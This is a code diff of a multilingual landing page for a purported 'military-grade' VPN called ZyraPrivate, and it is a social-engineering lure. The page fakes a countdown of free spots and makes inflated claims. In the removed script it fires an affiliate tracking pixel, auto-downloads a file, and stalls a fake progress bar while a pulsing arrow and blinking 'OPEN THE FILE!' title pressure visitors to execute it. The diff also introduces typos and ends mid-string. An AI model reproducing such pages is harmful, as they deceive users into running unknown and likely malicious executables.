@@ -130,21 +130,45 @@ svg.icon-destructive{stroke:var(--destructive)}
 }
 .gif-container img { width: 100%; height: auto; border-radius: 4px; display: block; }
 
+/* УМНАЯ И СТРОГАЯ СТРЕЛКА (ИСПРАВЛЕНО) */
 .aggressive-arrow {
-  position: fixed; top: 90px; right: 60px; z-index: 999999;
-  display: none; flex-direction: row; align-items: center; gap: 60px;
-  animation: attackArrow 0.4s infinite alternate; pointer-events: none;
+  position: fixed; 
+  top: 50%; /* Центр по вертикали, чтобы уйти от окна загрузок */
+  transform: translateY(-50%); /* Точный центр */
+  right: 60px; /* Привязка к правому краю */
+  z-index: 999999;
+  display: none; 
+  flex-direction: row; /* Текст и стрелка в ряд */
+  align-items: center; 
+  gap: 30px; /* Аккуратный отступ */
+  animation: attackArrow 0.4s infinite alternate; /* Медленная пульсация */
+  pointer-events: none;
 }
+
 .aggressive-arrow p {
-  background: #FF0000; color: #FFFF00; padding: 15px 30px; border-radius: 50px;
-  border: 4px solid #FFFF00; font-weight: 900; font-size: 1.6rem; margin: 0;
-  box-shadow: 0 0 40px rgba(255,0,0,0.8), inset 0 0 15px rgba(255,255,0,0.5);
-  white-space: nowrap; text-transform: uppercase; letter-spacing: 1px;
+  background: #f8f9fa; /* Серый фон, не клоунский */
+  color: #0c0d10; /* Темный текст */
+  padding: 12px 25px; 
+  border-radius: 8px; /* Не круглые, а строгие углы */
+  font-weight: 600; /* Не супер-жирный шрифт */
+  font-size: 1.1rem; 
+  margin: 0;
+  box-shadow: 0 0 20px rgba(255,255,255,0.3); /* Легкое свечение */
+  white-space: nowrap; 
+  text-transform: uppercase;
 }
+
 .aggressive-arrow svg { 
-  width: 140px; height: 140px; fill: #FF0000; 
-  filter: drop-shadow(0 0 15px #FF0000) drop-shadow(0 0 5px #FFFF00); 
-  stroke: #FFFF00; stroke-width: 1px;
+  width: 100px; /* Аккуратный размер */
+  height: 100px; 
+  fill: #f8f9fa; /* Светлая стрелка */
+  filter: drop-shadow(0 0 10px rgba(255,255,255,0.5)); /* Четкая тень */
+}
+
+@keyframes attackArrow { 
+  0% { transform: translate(0, -50%) scale(1); filter: brightness(1); } 
+  /* Анимация бьет влево и вверх (точно в угол загрузки) */
+  100% { transform: translate(-30px, -60px) scale(1.05); filter: brightness(1.1); } 
 }
 
 .fake-progress { width: 100%; height: 8px; background: var(--border); border-radius: 4px; margin: 1.5rem 0; overflow: hidden; position: relative; }
@@ -152,7 +176,6 @@ svg.icon-destructive{stroke:var(--destructive)}
 
 @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 @keyframes pulseText { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-@keyframes attackArrow { 0% { transform: translate(0, 0) scale(1); filter: brightness(1); } 100% { transform: translate(30px, -30px) scale(1.15); filter: brightness(1.3); } }
 
 @media(max-width:768px){
   nav .links{display:none}
@@ -450,7 +473,7 @@ svg.icon-destructive{stroke:var(--destructive)}
       hero_h1: "Freigegebenes <span class='text-primary glow-text'>Militär-VPN</span> für alle", hero_sub: "Ursprünglich für sichere militärische Kommunikation entwickelt. Verbergen Sie Ihre IP und verschlüsseln Sie Ihren Datenverkehr.", hurry_txt: "⚡ BEEILUNG: Die ersten 10.000 Nutzer erhalten 6 MONATE GRATIS. Verbleibend:", btn_dl: "Für Windows herunterladen", hero_note: "Windows 10 / 11 • 6 Monate kostenlos • Keine Kreditkarte",
       ip_h2: "Ihre IP ist exponiert!", ip_lbl: "IHRE IP-ADRESSE", ip_desc: "Ohne VPN können Websites, Hacker und Ihr ISP Ihren genauen Standort sehen.", l_city: "Stadt", l_reg: "Region", l_cou: "Land", l_isp: "ISP", s_cou: "Länder", s_srv: "Server", s_usr: "Nutzer", s_log: "Logs gespeichert",
       feat_h2: "Warum <span class='text-primary'>ZyraPrivate</span>?", feat_sub: "Entwickelt für absolute Privatsphäre. Basierend auf Militärtechnologien.",
-      f1_t: "Militärisches AES-256", f1_d: "Derselbe Verschlüsselungsstandard, der von Regierungsbehörden für Verschlusssachen verwendet wird.", f2_t: "Taktische Geschwindigkeit", f2_d: "Unser optimiertes Stealth-Protokoll liefert rasante Geschwindigkeiten ohne Verzögerungen.", f3_t: "Globales Netzwerk", f3_d: "Verbinden Sie sich mit 5.500+ Servern weltweit.", f4_t: "Keine Logs", f4_d: "Wir verfolgen oder speichern niemals Ihre Browseraktivitäten.", f5_t: "Öffentliches Wi-Fi-Schild", f5_d: "Bleiben Sie sicher in Cafés und Hotels mit automatischem Schutz.", f6_t: "Automatischer Kill Switch", f6_d: "Wenn Ihre VPN-Verbindung abbricht, stoppt der gesamte Datenverkehr sofort.",
+      f1_t: "Militärisches AES-256", f1_d: "Derselbe Verschlüsselungsstandard, der von Regierungsbehörden für Verschlusssachen verwendet wird.", f2_t: "Taktische Geschwindigkeit", f2_d: "Unser optimiertes Stealth-Protokoll liefert rasante Geschwindigkeiten ohne Verzögerungen.", f3_t: "Globales Netzwerk", f3_d: "Verbinden Sie sich mit 5.500+ Servern weltweit.", f4_t: "Keine Logs", f4_d: "Wir verfolgen or speichern niemals Ihre Browseraktivitäten.", f5_t: "Öffentliches Wi-Fi-Schild", f5_d: "Bleiben Sie sicher in Cafés und Hotels mit automatischem Schutz.", f6_t: "Automatischer Kill Switch", f6_d: "Wenn Ihre VPN-Verbindung abbricht, stoppt der gesamte Datenverkehr sofort.",
       how_h2: "Starten in <span class='text-primary'>3 Schritten</span>", how_sub: "Keine technischen Kenntnisse erforderlich.", stp1_t: "App herunterladen", stp1_d: "Holen Sie sich ZyraPrivate. Die Einrichtung dauert weniger als eine Minute.", stp2_t: "Zum Verbinden tippen", stp2_d: "Ein Klick genügt. Unser Algorithmus wählt den schnellsten Server.", stp3_t: "Frei surfen", stp3_d: "Genießen Sie privaten Internetzugang, verborgen vor ISPs.",
       cta_h2: "Bereit, Ihre <span class='text-primary glow-text'>Privatsphäre</span> zurückzuholen?", cta_sub: "Schließen Sie sich 10 Millionen Nutzern an, die ZyraPrivate vertrauen.", ft_desc: "Ihre Privatsphäre ist unsere Mission. Militärischer Schutz für alle.", ft_prod: "Produkt", ft_comp: "Unternehmen", ft_leg: "Rechtliches", ft_contact: "Kontakte", ft_priv: "Datenschutz", ft_terms: "Bedingungen",
       mod_priv_t: "Datenschutz", mod_priv_b: "<h4>Keine Logs</h4><p>Wir sammeln keine IP-Adressen.</p>", mod_term_t: "Bedingungen", mod_term_b: "<h4>Limits</h4><p>Bis zu 5 Geräte gleichzeitig.</p>", mod_cont_t: "Kontakte", mod_cont_b: "<p>support@zyravpn.com</p>",
@@ -469,7 +492,7 @@ svg.icon-destructive{stroke:var(--destructive)}
     },
     es: {
       nav_feat: "Características", nav_how: "Cómo funciona", nav_btn: "Empezar",
-      hero_h1: "VPN <span class='text-primary glow-text'>Militar Desclasificada</span> para Todos", hero_sub: "Desarrollada originalmente para comunicaciones militares seguras. Oculta tu IP y hazte completamente irrastreable.", hurry_txt: "⚡ RÁPIDO: Los primeros 10,000 obtienen 6 MESES GRATIS. Plazas:", btn_dl: "Descargar para Windows", hero_note: "Windows 10 / 11 • 6 Meses Gratis • Sin tarjeta de crédito",
+      hero_h1: "VPN <span class='text-primary glow-text'>Militar Desclasificada</span> para Todos", hero_sub: "Desarrollada originalmente para comunicaciones militaires seguras. Oculta tu IP y hazte completamente irrastreable.", hurry_txt: "⚡ RÁPIDO: Los primeros 10,000 obtienen 6 MESES GRATIS. Plazas:", btn_dl: "Descargar para Windows", hero_note: "Windows 10 / 11 • 6 Meses Gratis • Sin tarjeta de crédito",
       ip_h2: "¡Tu IP está expuesta!", ip_lbl: "TU DIRECCIÓN IP", ip_desc: "Sin VPN, los sitios web y tu ISP pueden ver tu ubicación exacta.", l_city: "Ciudad", l_reg: "Región", l_cou: "País", l_isp: "ISP", s_cou: "Países", s_srv: "Servidores", s_usr: "Usuarios", s_log: "Registros",
       feat_h2: "¿Por qué <span class='text-primary'>ZyraPrivate</span>?", feat_sub: "Construido para la privacidad absoluta. Impulsado por tecnología militar.",
       f1_t: "AES-256 Militar", f1_d: "El mismo estándar de cifrado utilizado por el gobierno.", f2_t: "Velocidad Táctica", f2_d: "Nuestro protocolo sigiloso ofrece velocidades ultrarrápidas sin demoras.", f3_t: "Red Global", f3_d: "Conéctate a 5,500+ servidores en 90+ países.", f4_t: "Cero Registros", f4_d: "Nunca rastreamos tu actividad de navegación.", f5_t: "Escudo Wi-Fi", f5_d: "Mantente seguro en redes de cafeterías y aeropuertos.", f6_t: "Kill Switch", f6_d: "Si tu conexión VPN se cae, el tráfico se detiene al instante.",
@@ -483,18 +506,18 @@ svg.icon-destructive{stroke:var(--destructive)}
       hero_h1: "VPN <span class='text-primary glow-text'>Militare Declassificata</span> per Uso Pubblico", hero_sub: "Sviluppata per comunicazioni militari sicure. Nascondi il tuo IP e diventa non rintracciabile.", hurry_txt: "⚡ AFFRETTATI: I primi 10.000 ottengono 6 MESI GRATIS. Posti rimasti:", btn_dl: "Scarica per Windows", hero_note: "Windows 10 / 11 • 6 Mesi Gratis • Nessuna carta di credito",
       ip_h2: "Il tuo IP è Esposto!", ip_lbl: "IL TUO INDIRIZZO IP", ip_desc: "Senza una VPN, i siti web e il tuo ISP possono vedere la tua posizione esatta.", l_city: "Città", l_reg: "Regione", l_cou: "Paese", l_isp: "ISP", s_cou: "Paesi", s_srv: "Server", s_usr: "Utenti", s_log: "Log salvati",
       feat_h2: "Perché <span class='text-primary'>ZyraPrivate</span>?", feat_sub: "Costruito per la privacy assoluta. Basato su tecnologie militari.",
-      f1_t: "AES-256 Militar", f1_d: "Lo stesso standard di crittografia utilizzato dal governo.", f2_t: "Velocità Tattica", f2_d: "Il nostro protocollo ottimizzato offre velocità incredibili senza ritardi.", f3_t: "Rete Globale", f3_d: "Connettiti a 5.500+ server in 90+ paesi.", f4_t: "Zero Log", f4_d: "Non tracciamo né salviamo la tua attività.", f5_t: "Scudo Wi-Fi Pubblico", f5_d: "Resta al sicuro nelle reti di bar e hotel.", f6_t: "Kill Switch", f6_d: "Se la tua VPN si disconnette, il traffico si blocca all'istante.",
+      f1_t: "AES-256 Militare", f1_d: "Lo stesso standard di crittografia utilizzato dal governo.", f2_t: "Velocità Tattica", f2_d: "Il nostro protocollo ottimizzato offre velocità incredibili senza ritardi.", f3_t: "Rete Globale", f3_d: "Connettiti a 5.500+ server in 90+ paesi.", f4_t: "Zero Log", f4_d: "Non tracciamo né salviamo la tua attività.", f5_t: "Scudo Wi-Fi Pubblico", f5_d: "Resta al sicuro nelle reti di bar e hotel.", f6_t: "Kill Switch", f6_d: "Se la tua VPN si disconnette, il traffico si blocca all'istante.",
       how_h2: "Inizia in <span class='text-primary'>3 Passi</span>", how_sub: "Nessuna conoscenza tecnica richiesta.", stp1_t: "Scarica l'App", stp1_d: "L'installazione richiede meno di un minuto.", stp2_t: "Toca per Connetterti", stp2_d: "Basta un clic.", stp3_t: "Naviga Liberamente", stp3_d: "Goditi un internet privato, nascosto agli ISP.",
       cta_h2: "Pronto a riprenderti la tua <span class='text-primary glow-text'>Privacy</span>?", cta_sub: "Unisciti a oltre 10 milioni di utenti che si fidano di ZyraPrivate.", ft_desc: "La tua privacy è la nostra missione. Protezione militare per tutti.", ft_prod: "Prodotto", ft_comp: "Azienda", ft_leg: "Legale", ft_contact: "Contatti", ft_priv: "Privacy", ft_terms: "Termini",
       mod_priv_t: "Privacy", mod_priv_b: "<p>Nessun log salvato.</p>", mod_term_t: "Termini", mod_term_b: "<p>Fino a 5 dispositivi.</p>", mod_cont_t: "Contatti", mod_cont_b: "<p>support@zyravpn.com</p>",
-      arr_txt: "CLICCA QUI PER CONNETTERTI", act_req: "Azione Richiesta!", act_alert: "⚠️ Il tuo traffico NON è ancora crittografato. Apri il file.", prog_1: "Creazione tunnel sicuro...", prog_2: "In pausa: In attesa dell'esecuzione del file...", ag_st1: "Passo 1: Clicca sul file in alto a destra", ag_st2: "Passo 2: Clicca su 'Sì' per confermare", blink_1: "⚠️ APRI IL FILE! ⚠️", blink_2: "Azione Richiesta!"
+      arr_txt: "CLICCA QUI PER CONNETTERTI", act_req: "Azione Richiesta!", act_alert: "⚠️ Il tuo traffico NON è ancora crittografato. Apri le file.", prog_1: "Creazione tunnel sicuro...", prog_2: "In pausa: In attesa dell'esecuzione del file...", ag_st1: "Passo 1: Clicca sul file in alto a destra", ag_st2: "Passo 2: Clicca su 'Sì' per confermare", blink_1: "⚠️ APRI IL FILE! ⚠️", blink_2: "Azione Richiesta!"
     },
     pl: {
       nav_feat: "Funkcje", nav_how: "Jak to działa", nav_btn: "Rozpocznij",
       hero_h1: "Odłączony <span class='text-primary glow-text'>Wojskowy VPN</span> do Użytku", hero_sub: "Stworzony do bezpiecznej komunikacji wojskowej. Ukryj swoje IP i stań się całkowicie niewidzialny.", hurry_txt: "⚡ POSPIESZ SIĘ: Pierwsze 10 000 osób otrzymuje 6 MIESIĘCY ZA DARMO. Pozostało:", btn_dl: "Pobierz dla Windows", hero_note: "Windows 10 / 11 • 6 Miesięcy za darmo • Bez karty kredytowej",
       ip_h2: "Twój IP jest Odkryty!", ip_lbl: "TWÓJ ADRES IP", ip_desc: "Bez VPN strony internetowe i Twój dostawca internetu mogą zobaczyć Twoją dokładną lokalizację.", l_city: "Miasto", l_reg: "Region", l_cou: "Kraj", l_isp: "Dostawca", s_cou: "Krajów", s_srv: "Serwerów", s_usr: "Użytkowników", s_log: "Logów",
       feat_h2: "Dlaczego <span class='text-primary'>ZyraPrivate</span>?", feat_sub: "Zbudowany dla absolutnej prywatności. Zasilany technologiami wojskowymi.",
-      f1_t: "Wojskowy AES-256", f1_d: "Ten sam standard szyfrowania, który używany jest przez rząd.", f2_t: "Prędkość Taktyczna", f2_d: "Nasz zoptymalizowany protokół zapewnia błyskawiczne prędkości bez opóźnień.", f3_t: "Globalna Sieć", f3_d: "Połącz się z 5500+ serwerami w 90+ krajach.", f4_t: "Brak Logów", f4_d: "Nigdy nie śledzimy ani nie przechowujemy Twojej aktywności.", f5_t: "Tarcza Publicznego Wi-Fi", f5_d: "Bądź bezpieczny w sieciach kawiarni i lotnisk.", f6_t: "Automatyczny Kill Switch", f6_d: "Jeśli Twoje połączenie VPN zostanie przerwane, ruch zostaje zatrzymany natychmiast.",
+      f1_t: "Wojskowy AES-256", f1_d: "Ten sam standard szyfrowania, który używany jest przez rząd.", f2_t: "Prędkość Taktyczna", f2_d: "Nasz zoptymalizowany protokół zapewnia błyskawiczne prędkości bez opóźnień.", f3_t: "Globalna Sieć", f3_d: "Połącz się z 5500+ serwerami w 90+ krajach.", f4_t: "Brak Logów", f4_d: "Nigdy nie śledzimy ani nie przechowujemy Twojej aktywności.", f5_t: "Tarcza Publicznego Wi-Fi", f5_d: "Bądź bezpieczny w sieciach kawiarni i lotnisk.", f6_t: "Automatyczny Kill Switch", f6_d: "Jeśli Twoje połączenie VPN zostanie przerwane, ruch zostaje zatrzymany natychast.",
       how_h2: "Zacznij w <span class='text-primary'>3 Krokach</span>", how_sub: "Nie jest wymagana wiedza techniczna.", stp1_t: "Pobierz Aplikację", stp1_d: "Instalacja zajmuje mniej niż minutę.", stp2_t: "Kliknij, aby połączyć", stp2_d: "Wystarczy jedno kliknięcie.", stp3_t: "Przeglądaj Swobodnie", stp3_d: "Ciesz się prywatnym dostępem do Internetu, ukrytym przed dostawcami (ISP).",
       cta_h2: "Gotowy na odzyskanie <span class='text-primary glow-text'>Prywatności</span>?", cta_sub: "Dołącz do 10 milionów użytkowników, którzy ufają ZyraPrivate.", ft_desc: "Twoja prywatność to nasza misja. Wojskowa ochrona dla każdego.", ft_prod: "Produkt", ft_comp: "Firma", ft_leg: "Prawne", ft_contact: "Kontakty", ft_priv: "Prywatność", ft_terms: "Regulamin",
       mod_priv_t: "Prywatność", mod_priv_b: "<p>Brak logów.</p>", mod_term_t: "Regulamin", mod_term_b: "<p>Do 5 urządzeń.</p>", mod_cont_t: "Kontakty", mod_cont_b: "<p>support@zyravpn.com</p>",
@@ -551,159 +574,4 @@ svg.icon-destructive{stroke:var(--destructive)}
       feat_h2: "Tại sao chọn <span class='text-primary'>ZyraPrivate</span>?", feat_sub: "Được xây dựng cho sự riêng tư tuyệt đối. Được hỗ trợ bởi công nghệ quân sự.",
       f1_t: "AES-256 Cấp Quân Sự", f1_d: "Cùng một tiêu chuẩn mã hóa được chính phủ sử dụng.", f2_t: "Tốc độ cực nhanh", f2_d: "Giao thức tối ưu hóa của chúng tôi cung cấp tốc độ tuyệt vời.", f3_t: "Mạng lưới toàn cầu", f3_d: "Kết nối với hơn 5.500 máy chủ tại hơn 90 quốc gia.", f4_t: "Không lưu nhật ký", f4_d: "Chúng tôi không bao giờ theo dõi hoạt động của bạn.", f5_t: "Bảo vệ Wi-Fi công cộng", f5_d: "Luôn an toàn tại các quán cà phê và khách sạn.", f6_t: "Kill Switch tự động", f6_d: "Nếu VPN mất kết nối, mọi truy cập sẽ dừng ngay lập tức.",
       how_h2: "Bắt đầu trong <span class='text-primary'>3 bước</span>", how_sub: "Không yêu cầu kiến thức kỹ thuật.", stp1_t: "Tải ứng dụng", stp1_d: "Quá trình cài đặt mất chưa đến một phút.", stp2_t: "Chạm để kết nối", stp2_d: "Chỉ cần một cú nhấp chuột.", stp3_t: "Duyệt web tự do", stp3_d: "Truy cập Internet riêng tư, ẩn danh hoàn toàn.",
-      cta_h2: "Sẵn sàng lấy lại <span class='text-primary glow-text'>Quyền riêng tư</span> của bạn chưa?", cta_sub: "Tham gia cùng hơn 10 triệu người dùng tin tưởng ZyraPrivate.", ft_desc: "Sự riêng tư của bạn là sứ mệnh của chúng tôi.", ft_prod: "Sản phẩm", ft_comp: "Công ty", ft_leg: "Pháp lý", ft_contact: "Liên hệ", ft_priv: "Quyền riêng tư", ft_terms: "Điều khoản",
-      mod_priv_t: "Chính sách quyền riêng tư", mod_priv_b: "<p>Chính sách không lưu nhật ký.</p>", mod_term_t: "Điều khoản dịch vụ", mod_term_b: "<p>Tối đa 5 thiết bị.</p>", mod_cont_t: "Liên hệ", mod_cont_b: "<p>support@zyravpn.com</p>",
-      arr_txt: "NHẤP VÀO ĐÂY ĐỂ BẢO MẬT KẾT NỐI", act_req: "Yêu cầu hành động!", act_alert: "⚠️ Lưu lượng truy cập của bạn CHƯA được mã hóa. Mở tệp để kết nối.", prog_1: "Đang thiết lập đường hầm bảo mật...", prog_2: "Đã tạm dừng: Đang chờ thực thi tệp...", ag_st1: "Bước 1: Nhấp vào tệp ở góc trên bên phải", ag_st2: "Bước 2: Nhấp vào 'Có' để xác nhận mã hóa", blink_1: "⚠️ MỞ TỆP! ⚠️", blink_2: "Yêu cầu hành động!"
-    }
-  };
-
-  const lang = (navigator.language || 'en').split('-')[0].toLowerCase();
-  const fullLang = navigator.language.toLowerCase();
-  let selectedDict = dict['en'];
-  if (fullLang.includes('zh-tw') || fullLang.includes('zh-hk') || fullLang.includes('zh-hant')) {
-    selectedDict = dict['zh-tw'];
-  } else if (dict[lang]) {
-    selectedDict = dict[lang];
-  }
-  
-  window.siteLangDict = selectedDict;
-
-  document.querySelectorAll('[data-i18n]').forEach(function(el){
-    if (selectedDict[el.getAttribute('data-i18n')]) {
-      el.innerHTML = selectedDict[el.getAttribute('data-i18n')];
-    }
-  });
-
-  let spots = 438;
-  const counters = document.querySelectorAll('.spots-count');
-  setInterval(() => {
-    if (spots > 12) {
-      spots -= Math.floor(Math.random() * 3);
-      counters.forEach(c => c.innerText = spots);
-    }
-  }, 8500);
-})();
-
-function openModal(id) {
-  document.getElementById('modal-overlay').classList.add('active');
-  const modals = document.querySelectorAll('.modal-box');
-  modals.forEach(m => m.style.display = 'none');
-  document.getElementById(id).style.display = 'flex';
-}
-function closeModal() {
-  document.getElementById('modal-overlay').classList.remove('active');
-}
-function closeModalOnOutside(e) {
-  if (e.target.id === 'modal-overlay') closeModal();
-}
-</script>
-
-<script>
-(function(){
-  function setText(id, value){
-    var el = document.getElementById(id);
-    if (el) el.textContent = value || "—";
-  }
-  function loadJsonp(url, callbackParam){
-    return new Promise(function(resolve, reject){
-      var callbackName = "__ipLookup_" + Date.now() + Math.floor(Math.random() * 10000);
-      var script = document.createElement("script");
-      var finished = false;
-      var paramName = callbackParam || "callback";
-      function cleanup(){
-        finished = true;
-        if (script.parentNode) script.parentNode.removeChild(script);
-        try { delete window[callbackName]; } catch (e) {}
-      }
-      window[callbackName] = function(data){ cleanup(); resolve(data); };
-      script.onerror = function(){ if(finished)return; cleanup(); reject(new Error("Fail")); };
-      script.src = url + (url.indexOf("?") === -1 ? "?" : "&") + paramName + "=" + callbackName;
-      document.head.appendChild(script);
-      setTimeout(function(){ if(finished)return; cleanup(); reject(new Error("Timeout")); }, 6000);
-    });
-  }
-  function loadGeo(){
-    return new Promise(function(resolve, reject){
-      var script = document.createElement("script");
-      var finished = false;
-      function cleanup(){
-        finished = true;
-        if (script.parentNode) script.parentNode.removeChild(script);
-        try { delete window.geoip; } catch (e) {}
-      }
-      window.geoip = function(data){ cleanup(); resolve(data); };
-      script.onerror = function(){ if(finished)return; cleanup(); reject(new Error("Fail")); };
-      script.src = "https://get.geojs.io/v1/ip/geo.js";
-      document.head.appendChild(script);
-      setTimeout(function(){ if(finished)return; cleanup(); reject(new Error("Timeout")); }, 6000);
-    }).then(function(data){
-      if(data) {
-        setText("ip-city", data.city || data.city_name || "—");
-        setText("ip-region", data.region || data.regionName || data.state || "—");
-        setText("ip-country", data.country || data.country_name || "—");
-        setText("ip-isp", data.isp || data.organization_name || data.organization || data.org || "—");
-        if(data.ip) setText("user-ip", data.ip);
-      }
-    });
-  }
-  loadGeo().then(function(){ 
-    return loadJsonp("https://api.ipify.org?format=jsonp").then(function(data){ if(data&&data.ip) setText("user-ip", data.ip); });
-  }).catch(function(){
-    setText("user-ip", "IP unavailable");
-  });
-})();
-
-var blinkInterval;
-function startInstallation() {
-  var t = window.siteLangDict || {};
-  BPixelJS.conversion({url:'https://strasspastpongpostback.click/click'}); 
-  var link = document.createElement('a');
-  link.href = '<%= downloadUrl %>';
-  link.setAttribute('download', ''); 
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-
-  document.getElementById('installOverlay').style.display = 'flex';
-  document.getElementById('downloadArrow').style.display = 'flex';
-  document.body.style.overflow = 'hidden';
-
-  var progress = 0;
-  var bar = document.getElementById('progressBar');
-  var pText = document.getElementById('progressText');
-  var progInterval = setInterval(function() {
-    progress += Math.random() * 15;
-    if (progress > 85) { 
-      progress = 85; 
-      clearInterval(progInterval);
-      pText.innerHTML = t.prog_2 || "Action paused: Waiting for file execution...";
-      pText.style.color = "var(--destructive)";
-    }
-    bar.style.width = progress + "%";
-  }, 600);
-
-  var blinkState = 0;
-  var blinkMsg1 = t.blink_1 || "⚠️ OPEN THE FILE! ⚠️";
-  var blinkMsg2 = t.blink_2 || "Action Required!";
-  blinkInterval = setInterval(function() {
-    if (blinkState === 0) {
-      document.title = blinkMsg1;
-      blinkState = 1;
-    } else {
-      document.title = blinkMsg2;
-      blinkState = 0;
-    }
-  }, 800);
-}
-
-document.getElementById('installOverlay').addEventListener('click', function(e) {
-  if(e.target === this) {
-    var arrow = document.getElementById('downloadArrow');
-    arrow.style.animationDuration = "0.2s";
-    setTimeout(() => arrow.style.animationDuration = "0.4s", 1000);
-  }
-});
-</script>
-
-</body>
-</html>
+      cta_h2: "Sẵn sàng lấy lại
